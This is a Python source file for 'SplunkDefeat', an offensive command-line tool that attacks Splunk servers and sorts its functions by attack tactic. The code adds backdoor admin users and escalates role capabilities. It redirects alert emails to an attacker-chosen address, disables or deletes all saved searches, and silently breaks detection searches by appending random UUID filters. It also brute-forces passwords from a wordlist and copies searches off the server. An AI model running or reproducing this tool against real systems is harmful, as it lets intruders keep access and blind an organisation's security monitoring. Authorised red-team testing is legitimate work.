#!/usr/bin/env python
# import modules in standard python library
import argparse
import os
import sys
import uuid

# import external python modules
import splunklib.client as client
from dotenv import load_dotenv
from splunklib.client import connect
from prettytable import PrettyTable

class bcolors:
    SPLASH = '\033[92m'
    INFO = '\033[94m'
    UPDATE = '\033[96m'
    WARNING = '\033[93m'
    ERROR = '\033[91m'
    ENDC = '\033[0m'

def splash():
    print(bcolors.SPLASH + """
    
    ███████╗██████╗ ██╗     ██╗   ██╗███╗   ██╗██╗  ██╗██████╗ ███████╗███████╗███████╗ █████╗ ████████╗
    ██╔════╝██╔══██╗██║     ██║   ██║████╗  ██║██║ ██╔╝██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗╚══██╔══╝
    ███████╗██████╔╝██║     ██║   ██║██╔██╗ ██║█████╔╝ ██║  ██║█████╗  █████╗  █████╗  ███████║   ██║   
    ╚════██║██╔═══╝ ██║     ██║   ██║██║╚██╗██║██╔═██╗ ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██║   ██║   
    ███████║██║     ███████╗╚██████╔╝██║ ╚████║██║  ██╗██████╔╝███████╗██║     ███████╗██║  ██║   ██║   
    ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝   v1.0

    # @markernest0
    # medium.com/@markernest
    
    """ + bcolors.ENDC)

def parser_error(errmsg):
    splash()
    print("##### USAGE: python " + sys.argv[0] + " [Options] use -h for help" + '\n')
    print(bcolors.ERROR + "##### ERROR: " + errmsg + bcolors.ENDC + '\n')
    sys.exit()

def parse_args():
    splash()
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -u backupadmin -p mypassword -r admin")
    parser = argparse.ArgumentParser()
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    ### RECONNAISSANCE
    ### PERSISTENCE
    persistence_adduser = parser.add_argument_group("PERSISTENCE -- ADD USER")
    persistence_adduser.add_argument('-au', '--add_user', help='Enter the username to create')
    persistence_adduser.add_argument('-ap', '--assign_password', help='Enter the password of the new user')
    persistence_adduser.add_argument('-ar', '--assign_role', choices=['admin', 'power', 'user'], default='admin', help='Specify the role of the new user (default choice is admin)')
    persistence_modrole = parser.add_argument_group("PERSISTENCE -- MODIFY ROLE")
    persistence_modrole.add_argument('-ur', '--update_role', choices=['admin', 'power', 'user'], help='Specify the role to update with a capability')
    persistence_modrole.add_argument('-uc', '--update_capability', choices=['admin_all_objects', 'schedule_search', 'edit_user', 'delete_by_keyword', 'all'], help='Specify the capability to add to a role')
    ### DEFENSE EVASION
    defense_updatemail = parser.add_argument_group("DEFENSE EVASION -- UPDATE EMAIL")
    defense_updatemail.add_argument('-ue', '--update_email', help='Enter the new email address for alerts')
    defense_dissearches = parser.add_argument_group("DEFENSE EVASION -- DISABLE SEARCHES")
    defense_dissearches.add_argument('-ds', '--disable_searches', nargs='?', const='all', help='Disable all searches')
    defense_ensearches = parser.add_argument_group("DEFENSE EVASION -- ENABLE SEARCHES")
    defense_ensearches.add_argument('-es', '--enable_searches', nargs='?', const='all', help='Enable all searches')
    ### CREDENTIAL ACCESS
    credential_bruteforce = parser.add_argument_group("CREDENTIAL ACCESS -- BRUTE FORCE")
    credential_bruteforce.add_argument('-sh', '--splunk_host', help='Domain name or IP address to enumerate')
    credential_bruteforce.add_argument('-sp', '--splunk_port', type=int, default=8089, help='Connect to the host on the tcp port')
    credential_bruteforce.add_argument('-su', '--splunk_user', help='Specify the username')
    credential_bruteforce.add_argument('-sf', '--password_file', action='store_true', help='Specify the use of a password file')
    ### DISCOVERY
    discovery_listuser = parser.add_argument_group("DISCOVERY -- LIST USERS")
    discovery_listuser.add_argument('-lu', '--list_user', nargs='?', const='all', help='List current user')
    discovery_listuser.add_argument('-la', '--list_all', nargs='?', const='all', help='List all users')
    discovery_listroles = parser.add_argument_group("DISCOVERY -- LIST ROLES")
    discovery_listroles.add_argument('-lr', '--list_roles', nargs='?', const='all', help='List all roles')
    discovery_listsearches = parser.add_argument_group("DISCOVERY -- LIST SEARCHES")
    discovery_listsearches.add_argument('-ls', '--list_searches', nargs='?', const='all', help='List all searches')
    ### EXFILTRATION
    exfil_savesearches = parser.add_argument_group("EXFILTRATION -- SAVE SEARCHES")
    exfil_savesearches.add_argument('-ss', '--save_searches', nargs='?', const='all', help='Save all searches locally')
    ### IMPACT
    impact_deluser = parser.add_argument_group("IMPACT -- DELETE USER")
    impact_deluser.add_argument('-du', '--delete_user', help='Delete a specific user')
    impact_delsearches = parser.add_argument_group("IMPACT -- DELETE SEARCHES")
    impact_delsearches.add_argument('-rs', '--delete_searches', nargs='?', const='all', help='Delete all searches')
    impact_mansearches = parser.add_argument_group("IMPACT -- MANIPULATE SEARCHES")
    impact_mansearches.add_argument('-ms', '--manipulate_searches', nargs='?', const='all', help='Manipulate all searches')
    return parser.parse_args()
  
def main(username, password, roles, updaterole, updatecapability, updateemail, disablesearches, enablesearches, splunkhost, splunkport, splunkuser, passwordfile, listuser, listusers, listroles, listsearches, savesearches, delusername, delsearches, modsearches):
    # Parse env file and connect to Splunk
    if not splunkhost or splunkport or splunkuser or passwordfile:
      try:
        load_dotenv()
      except Exception as e:
        print(e)
      try:
        service = client.connect(
            host=os.getenv("host"),
            port=os.getenv("port"),
            username=os.getenv("username"),
            password=os.getenv("password"),
            owner="-",
            app="search")
      except Exception as e:
        print(bcolors.ERROR + "##### ERROR -", e, "Check the .env file parameters." + bcolors.ENDC)
        print('\n')
        sys.exit(1)

    # PERSISTENCE
    # Create a new user
    if username and password is not None:
      add_user(username, password, roles, service)

    # Update a lower privileged role with advanced capability
    if updaterole and updatecapability is not None:
      priv_update_role(updaterole, updatecapability, service)

    # DEFENSE EVASION
    # Update the email for all alerts
    if updateemail is not None:
      update_email(updateemail, service)

    # Disable all alerts in search app
    if disablesearches is not None:
      disable_searches(disablesearches, service)

    # Enable all alerts in search app
    if enablesearches is not None:
      enable_searches(enablesearches, service)

    # CREDENTIAL ACCESS
    # Manually define Splunk connection parameters and brute force password
    if splunkhost and splunkport and splunkuser and passwordfile is not None:
      brute_force(splunkhost, splunkport, splunkuser, passwordfile, service)
   
    # DISCOVERY
    # List current user
    if listuser is not None:
      list_user(listuser, service)

    # List all users
    if listusers is not None:
      list_users(listusers, service)

    # List all roles
    if listroles is not None:
      list_roles(listroles, service)

    # List all searches
    if listsearches is not None:
      list_searches(listsearches, service)

    # EXFILTRATION #
    # Save all searches locally
    if savesearches is not None:
      save_all_searches(savesearches, service)

    # IMPACT
    # Delete a user
    if delusername is not None:
      del_user(delusername, service)

    # Delete all searches
    if delsearches is not None:
      del_searches(delsearches, service)

    # Manipulate all searches
    if modsearches is not None:
      mod_searches(modsearches, service)

# PERSISTENCE
# Create a new user function
def add_user(username, password, roles, service):
  check_role(service)
  try:
    newuser = service.users.create(
      username=username,
      password=password,
      roles=[roles])
    print(bcolors.UPDATE + "##### UPDATE - Creating a new user:", username, "with the role:", roles + bcolors.ENDC)
  except Exception as e:
    print(bcolors.ERROR + "##### ERROR - ", e, bcolors.ENDC)
  print('\n')

# Update a lower privileged role with advanced capability function
def priv_update_role(updaterole, updatecapability, service):
  check_role(service)
  try:
    roleupdate = service.roles[updaterole]
    if updatecapability == 'all':
      roleupdate.grant('admin_all_objects', 'schedule_search', 'edit_user', 'delete_by_keyword')
      roleupdate.refresh()
      print(bcolors.UPDATE + "##### UPDATE - Updating the role:", updaterole, "with the capability: admin_all_objects, schedule_search, edit_user, delete_by_keyword" + bcolors.ENDC)
    else:
      roleupdate.grant(updatecapability)
      roleupdate.refresh()
      print(bcolors.UPDATE + "##### UPDATE - Updating the role:", updaterole, "with the capability:", updatecapability + bcolors.ENDC)
  except Exception as e:
    print(bcolors.ERROR + "##### ERROR - ", e, bcolors.ENDC)
  print('\n')

# DEFENSE EVASION #   
# Update the email for all alerts function
def update_email(updateemail, service):
  check_role(service)
  savedsearches = service.saved_searches
  kwargs_email = {'action.email.to':updateemail}
  for savedsearch in savedsearches:
    try:
      savedsearch.update(**kwargs_email)
      print(bcolors.UPDATE + "##### UPDATE - Modifying the search:", savedsearch.name, "with the email:", kwargs_email['action.email.to'] + bcolors.ENDC)
    except Exception as e:
      print(bcolors.ERROR + "##### ERROR - ", e, bcolors.ENDC)
  print('\n')

# Disable all alerts in search app function
def disable_searches(disablesearches, service):
  check_role(service)
  savedsearches = service.saved_searches
  for savedsearch in savedsearches:
    try:
      savedsearch.disable()
      print(bcolors.UPDATE + "##### UPDATE - Disabling the search:", savedsearch.name + bcolors.ENDC)
    except Exception as e:
      print(bcolors.ERROR + "##### ERROR - ", e, bcolors.ENDC)
  print('\n')

# Enable all alerts in search app function
def enable_searches(enablesearches, service):
  check_role(service)
  savedsearches = service.saved_searches
  for savedsearch in savedsearches:
    try:
      savedsearch.enable()
      print(bcolors.UPDATE + "##### UPDATE - Enabling the search:", savedsearch.name + bcolors.ENDC)
    except Exception as e:
      print(bcolors.ERROR + "##### ERROR - ", e, bcolors.ENDC)
  print('\n')
  
# CREDENTIAL ACCESS
# Brute force Splunk connection function:
def brute_force(splunkhost, splunkport, splunkuser, passwordfile, service):
  current_path = os.path.dirname(__file__)
  creds_path = os.path.relpath('../creds/creds.txt', current_path)
  with open(creds_path, 'r') as f:
    for cred in f:
      password = cred.strip()
      try:
        service = client.connect(
          host=splunkhost,
          port=splunkport,
          username=splunkuser,
          password=password)
        print(bcolors.UPDATE + "##### Login success - " + splunkuser + " : " + password + bcolors.ENDC)
        break
      except Exception as e:
        print(bcolors.WARNING + "#####", e, "-", str(splunkuser),":",str(password) + bcolors.ENDC)
  print('\n')

# DISCOVERY
# List current user function
def list_user(listuser, service):
  check_role(service)
  user = service.users[os.getenv("username")]
  for role in user.role_entities:
    continue
  table = PrettyTable([bcolors.UPDATE + 'Username', 'Real Name', 'Role' + bcolors.ENDC])
  table.add_row([bcolors.UPDATE + user.name, user.realname, role.name + bcolors.ENDC])
  print(table)
  print('\n')

# List all users function
def list_users(listusers, service):
  kwargs = {"sort_key":"realname", "sort_dir":"asc"}
  users = service.users.list(count=-1,**kwargs)
  table = PrettyTable([bcolors.UPDATE + 'Username', 'Real Name', 'Role' + bcolors.ENDC])
  for user in users:
    for role in user.role_entities:
      table.add_row([bcolors.UPDATE + user.name, user.realname, role.name + bcolors.ENDC])
  check_role(service)
  print(table)
  print('\n')

# List all roles function
def list_roles(listroles, service):
  check_role(service)
  try:
    roles = service.roles
    print(bcolors.UPDATE + "##### UPDATE - There are %s roles" % (len(roles)) + bcolors.ENDC)
    print('\n')
  except Exception as e:
    print(bcolors.ERROR + "##### ERROR - ", e, bcolors.ENDC)
  try:
    for role in roles:
      print(bcolors.UPDATE + str(role.name) + bcolors.ENDC)
      for capability in role.capabilities:
        print(bcolors.UPDATE + " - " + str(capability) + bcolors.ENDC)
      for capability in role.imported_capabilities:
        print(bcolors.UPDATE + " - " + str(capability) + "(imported)" + bcolors.ENDC)
  except Exception as e:
    print(bcolors.ERROR + "##### ERROR - ", e, bcolors.ENDC)
  print('\n')

# List all searches function
def list_searches(listsearches, service):
  check_role(service)
  savedsearches = service.saved_searches
  for savedsearch in savedsearches:
    print([savedsearch.name, savedsearch["search"]])
    print('\n')
  
# EXFILTRATION functions
# Save all searches locally function
def save_all_searches(savesearches, service):
  check_role(service)
  savedsearches = service.saved_searches
  if not os.path.exists("../searches"):
    os.makedirs("../searches")
  os.chdir("../searches")
  for savedsearch in savedsearches:
    f = open('%s' % savedsearch.name+".splunk", 'wb')
    f = open(str(savedsearch.name+".splunk"), 'a')
    f.write(savedsearch["search"])
    f.close()
    print(bcolors.UPDATE + "##### UPDATE - Saving: ", savedsearch.name + bcolors.ENDC)
  print(bcolors.INFO + "##### INFO - Saving into the searches directory." + bcolors.ENDC)
  print('\n')

# IMPACT functions
# Delete a user function
def del_user(delusername, service):
  try:
    deluser = service.users.delete(delusername)
    print(bcolors.UPDATE + "##### UPDATE - Deleting the user:", delusername + bcolors.ENDC)
    print('\n')
  except Exception as e:
    print(bcolors.ERROR + "##### ERROR - ", e, bcolors.ENDC)
    print('\n')

# Delete all searches function
def del_searches(delsearches, service):
  check_role(service)
  savedsearches = service.saved_searches
  for savedsearch in savedsearches:
    try:
      savedsearch.delete()
      print(bcolors.UPDATE + "##### UPDATE - Deleting the search:", savedsearch.name + bcolors.ENDC)
    except Exception as e:
      print(bcolors.ERROR + "##### ERROR - ", e, bcolors.ENDC)
      continue
  print('\n')

# Manipulate all searches function
def mod_searches(modsearches, service):
  check_role(service)
  savedsearches = service.saved_searches
  for savedsearch in savedsearches:
    try:
      search_uuid = str(uuid.uuid4())
      kwargs = {"search": savedsearch["search"] + " | search " + search_uuid}
      savedsearch.update(**kwargs).refresh()
      print(bcolors.UPDATE + "##### UPDATE - Manipulating the search:", savedsearch.name + bcolors.ENDC)
    except Exception as e:
      print(bcolors.ERROR + "##### ERROR - ", e, bcolors.ENDC)
      continue
  print('\n')

# Check role function for evaluating capability of command
def check_role(service):
  user = service.users[os.getenv("username")]
  for role in user.role_entities:
    continue
  if role.name != "admin":
    print(bcolors.WARNING + "##### WARNING - The username \"" + os.getenv("username") + "\" does not have the admin role and will not have the capabilities to modify all objects." + bcolors.ENDC)
    print('\n')
  else:
    print(bcolors.INFO + "##### INFO - The username \"" + os.getenv("username") + "\" has the admin role and should have the capabilities to modify all objects." + bcolors.ENDC)
    print('\n')

# All the argparse options returned to main
def interactive():
    args = parse_args()
    username = args.add_user
    password = args.assign_password
    roles = args.assign_role
    updaterole = args.update_role
    updatecapability = args.update_capability
    updateemail = args.update_email
    disablesearches = args.disable_searches
    enablesearches = args.enable_searches
    splunkhost = args.splunk_host
    splunkport = args.splunk_port
    splunkuser = args.splunk_user
    passwordfile = args.password_file
    listuser = args.list_user
    listusers = args.list_all
    listroles = args.list_roles
    listsearches = args.list_searches
    savesearches = args.save_searches
    delusername = args.delete_user
    delsearches = args.delete_searches
    modsearches = args.manipulate_searches
    res = main(
      username,
      password,
      roles,
      updaterole,
      updatecapability,
      updateemail,
      disablesearches,
      enablesearches,
      splunkhost,
      splunkport,
      splunkuser,
      passwordfile,
      listuser,
      listusers,
      listroles,
      listsearches,
      savesearches,
      delusername,
      delsearches,
      modsearches)
    
if __name__ == "__main__":
    interactive()
